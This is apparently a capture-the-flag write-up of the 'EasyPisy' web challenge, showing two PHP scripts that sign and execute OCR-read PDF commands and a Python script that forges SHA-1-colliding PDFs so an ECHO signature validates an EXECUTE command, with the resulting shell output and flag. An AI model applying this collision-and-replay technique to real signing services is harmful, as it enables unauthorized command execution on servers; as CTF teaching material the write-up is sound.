# WEB-EasyPisy
---
<img width="868" alt="1" src="https://user-images.githubusercontent.com/14992494/40003854-fb0c746c-57c6-11e8-8ee1-17ca4f0df72b.png">

The question privides a website which has file upload feature and the attached file has pdf files which have command strings.

<img width="432" alt="2" src="https://user-images.githubusercontent.com/14992494/40003855-fb3f7a60-57c6-11e8-9816-aae3a844bda2.png">

<img width="938" alt="3" src="https://user-images.githubusercontent.com/14992494/40003856-fb78506a-57c6-11e8-8aa7-79b5a764a418.png">

This is a php script for "sign your payload" feature(sign.php). This script generates signature string when a PDF file which has only "ECHO" command uploads to this page. 

```
<?php

include 'common.php';

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
  print highlight_string(file_get_contents("sign.php"), TRUE);
  exit(0);
}

$keys = get_keys();
$privkey = $keys[0];
$pubkey = $keys[1];

if ($privkey === FALSE || $pubkey === FALSE) {
  die("Could not load keys. Contact admin.<br/>");
}

$file_info = $_FILES['userfile'];
check_uploaded_file($file_info);

$text = pdf_to_text($file_info['tmp_name']);
print "Extracted text: \"$text\"<br/>";

$execute_query = "EXECUTE ";
$echo_query = "ECHO ";
if (substr($text, 0, strlen($execute_query)) === $execute_query) {
  print "I don't sign EXECUTE commands. Go away.<br/>";
} else if (substr($text, 0, strlen($echo_query)) === $echo_query) {
  print "I'm OK with ECHO commands. Here is the signature: <br/>";
  $data = file_get_contents($file_info['tmp_name']);
  openssl_sign($data, $signature, $privkey);
  print bin2hex($signature);
} else {
  print "I can't recognize the command type. Go away.<br/>";
}

?>
```

When "echo-ciao.pdf" is uploaded, response data prints signature string which is from given sample file  "echo-ciao.sig"

<img width="401" alt="5" src="https://user-images.githubusercontent.com/14992494/40003859-fbd7392c-57c6-11e8-985f-fd48e315b319.png">

```
[Response data]
Executing 'convert -depth 8 /tmp/phpWxM0cE.pdf /tmp/phpWxM0cE.ppm'
Executing 'ocrad /tmp/phpWxM0cE.ppm'
Extracted text: "ECHO ciao"
I'm OK with ECHO commands. Here is the signature: 
27480844e7f075a3bde72316bb6acbf1957ab6479f9facdefda9a2553f1abf526a96ace948ed61389797f0e7622d749af9069f22b8143cf8f18591899eeab74e807e33263969dc31de2c0a93cf01d3c30440bafd52a349474b775f670a01b3d6c5986d2f127323d8f7045d2cbab5e3549f945460bc7707febea53846c3ce0f3374b365823da25c4e885ddc4f77eaa876649dca168138e50458855eaafbd0c5c63b18d0c596f4a671fc4826ea0494558d57d0b9fbebef5058d66d18ca90a7e44beb33249acc3a36929a2ef11c034da89c99c5dd36c1f582f30199e15fc88cd98dd2b9d87c9796f0a24ef17269b8ad448a602ab0c568af11559134dd513b92a4c5
```

This is another php script for "execute for your signed payload" feature(execute.php). This script allows only "EXECUTE" command of PDF with signature string of the PDF.

```
<?php

include 'common.php';

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
  print highlight_string(file_get_contents("execute.php"), TRUE);
  exit(0);
}

$keys = get_keys();
$privkey = $keys[0];
$pubkey = $keys[1];

$file_info = $_FILES['userfile'];
check_uploaded_file($file_info);

$data = file_get_contents($file_info['tmp_name']);
$signature = hex2bin($_POST['signature']);
if (openssl_verify($data, $signature, $pubkey)) {
  print 'Signature is OK.<br/>';
} else {
  die('Bad signature.');
}

$text = pdf_to_text($file_info['tmp_name']);
print "Text: \"$text\"<br/>";

$execute_query = "EXECUTE ";
$echo_query = "ECHO ";
if (substr($text, 0, strlen($execute_query)) === $execute_query) {
  $payload = substr($text, strlen($execute_query));
  print "About to execute: \"$payload\".<br/>";
  $out = shell_exec($payload);
  print "Output: $out";
} else if (substr($text, 0, strlen($echo_query)) === $echo_query) {
  $payload = substr($text, strlen($echo_query));
  print "About to echo: \"$payload\".<br/>";
  echo $payload;
} else {
  print "I can't recognize the command type. Go away.<br/>";
}

?>
```

When "execute-ls.pdf" is uploaded with signature string from execute-ls.sign, it shows output of command in the "execute-ls.pdf" file properly.

<img width="521" alt="6" src="https://user-images.githubusercontent.com/14992494/40003860-fc0558fc-57c6-11e8-9add-e73bcb1a35b0.png">

```
Signature is OK.
Executing 'convert -depth 8 /tmp/phpHeQCo0.pdf /tmp/phpHeQCo0.ppm'
Executing 'ocrad /tmp/phpHeQCo0.ppm'
Text: "EXECUTE ls"
About to execute: "ls".
Output: common.php execute.php flag index.nginx-debian.html index.php private_key.pem public_key.pem sign.php
```

Here is a problem. To execute command in the second PHP page, it requires signature string from the first PHP page which allows only "ECHO" command. 

A SHA1 hash collision script from https://github.com/nneonneo/sha1collider is used to solve this problem.

```
from fpdf import FPDF
import os

def createPDF(command, filename):
    pdf=FPDF()
    pdf.add_page()
    pdf.set_font('Arial','B',50)
    pdf.cell(50,10,command)
    pdf.output(filename,'F')

if __name__ == "__main__":
    command = "ECHO cat flag"
    createPDF(command, "output1.pdf")
    
    command = "EXECUTE cat flag"
    createPDF(command, "output2.pdf")
    
    os.system("python3 collide.py output1.pdf output2.pdf -q 100 --progressive")
```

### Flag
```
Signature is OK.
Executing 'convert -depth 8 /tmp/phpDBEPow.pdf /tmp/phpDBEPow.ppm'
Executing 'ocrad /tmp/phpDBEPow.ppm'
Text: "EXECUTE cat flag"
About to execute: "cat flag".
Output: OOO{phP_4lw4y5_d3l1v3r5_3h7_b35T_fl4g5}
```
